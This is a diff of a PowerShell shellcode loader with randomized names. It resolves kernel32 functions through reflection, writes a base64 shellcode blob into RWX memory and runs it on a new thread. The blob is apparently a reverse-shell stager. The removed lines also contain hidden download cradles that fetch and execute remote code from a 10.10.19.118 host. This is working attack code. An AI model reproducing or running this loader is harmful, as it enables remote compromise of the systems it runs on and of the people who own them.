@@ -1,30 +1,27 @@
-powershell.exe -nop -w hidden -c $O=new-object net.webclient;$O.proxy=[Net.WebRequest]::GetSystemWebProxy();$O.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $O.downloadstring('http://10.10.19.118:8080/2aPNAwXBa');
-function vr0n4 {
-	Param ($tqWKX, $nNqU)		
-	$s0xy = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+function zm0vS {
+	Param ($aP5zp, $m9hL)		
+	$vuUb = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 	
-	return $s0xy.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($s0xy.GetMethod('GetModuleHandle')).Invoke($null, @($tqWKX)))), $nNqU))
+	return $vuUb.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vuUb.GetMethod('GetModuleHandle')).Invoke($null, @($aP5zp)))), $m9hL))
 }
 
-function iC {
+function vTu {
 	Param (
-		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $fG,
-		[Parameter(Position = 1)] [Type] $f1Y6j = [Void]
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $j_1G,
+		[Parameter(Position = 1)] [Type] $oU3 = [Void]
 	)
 	
-	$e1F = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-	$e1F.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $fG).SetImplementationFlags('Runtime, Managed')
-	$e1F.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $f1Y6j, $fG).SetImplementationFlags('Runtime, Managed')
+	$yv = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$yv.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $j_1G).SetImplementationFlags('Runtime, Managed')
+	$yv.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $oU3, $j_1G).SetImplementationFlags('Runtime, Managed')
 	
-	return $e1F.CreateType()
+	return $yv.CreateType()
 }
 
-[Byte[]]$twG = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABoKCgoTdkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
+[Byte[]]$kEJd = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcCgoTdkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
 		
-$lr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vr0n4 kernel32.dll VirtualAlloc), (iC @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $twG.Length,0x3000, 0x40)
-[System.Runtime.InteropServices.Marshal]::Copy($twG, 0, $lr, $twG.length)
+$rP = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((zm0vS kernel32.dll VirtualAlloc), (vTu @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $kEJd.Length,0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($kEJd, 0, $rP, $kEJd.length)
 
-$mfd = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vr0n4 kernel32.dll CreateThread), (iC @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lr,[IntPtr]::Zero,0,[IntPtr]::Zero)
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vr0n4 kernel32.dll WaitForSingleObject), (iC @([IntPtr], [Int32]))).Invoke($mfd,0xffffffff) | Out-Null
-
-powershell.exe -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy();$x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $x.downloadstring('http://10.10.19.118:8080/CU5A036dDNMV');
+$oFbXF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((zm0vS kernel32.dll CreateThread), (vTu @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$rP,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((zm0vS kernel32.dll WaitForSingleObject), (vTu @([IntPtr], [Int32]))).Invoke($oFbXF,0xffffffff) | Out-Null
